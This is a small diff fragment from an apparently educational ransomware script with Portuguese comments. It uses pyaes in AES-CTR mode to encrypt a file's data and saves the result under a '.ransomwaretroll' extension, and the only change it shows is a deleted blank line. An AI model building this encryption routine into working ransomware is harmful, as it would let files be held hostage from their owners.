@@ -17,7 +17,6 @@ aes = pyaes.AESModeOfOperationCTR(key)
 #criptografar o arquivo 
 crypto_data = aes.encrypt(file_data)
 
-
 #salvar o arquivo criptografado
 new_file = file_name + '.ransomwaretroll'
 new_file = open(f'{new_file}','wb')
